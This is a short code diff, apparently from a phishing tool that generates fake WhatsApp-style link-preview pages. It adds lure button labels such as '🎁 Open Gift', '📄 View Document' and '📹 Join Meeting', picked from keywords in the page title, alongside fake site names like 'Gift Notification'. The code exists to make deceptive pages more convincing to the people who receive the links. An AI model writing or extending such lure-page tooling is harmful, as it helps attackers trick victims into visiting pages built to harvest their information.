@@ -76,12 +76,25 @@ else:
 img_type = 'image/png' if ((img_name and img_name.lower().endswith('.png')) or image.lower().endswith('.png')) else 'image/jpeg'
 site_name = os.getenv('SITENAME') or ('Gift Notification' if 'gift' in title.lower() else 'Chat Group')
 
+btn_text = os.getenv('BTN_TEXT')
+if not btn_text:
+    if 'gift' in title.lower():
+        btn_text = '🎁 Open Gift'
+    elif any(w in title.lower() for w in ['document', 'file', 'asset']):
+        btn_text = '📄 View Document'
+    elif 'meeting' in title.lower() or 'zoom' in title.lower():
+        btn_text = '📹 Join Meeting'
+    else:
+        btn_text = 'Join Chat'
+utils.print(f'{G}[+] {C}Button Text :{W} ' + btn_text)
+
 with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
         code = code.replace('window.location = "https:" + restOfUrl;', '')
     code = code.replace('$TITLE$', title)
     code = code.replace('$DESC$', desc)
+    code = code.replace('$BTN_TEXT$', btn_text)
     code = code.replace('$OG_IMAGE$', og_image)
     code = code.replace('$OG_IMAGE_TYPE$', img_type)
     code = code.replace('$SITE_NAME$', site_name)
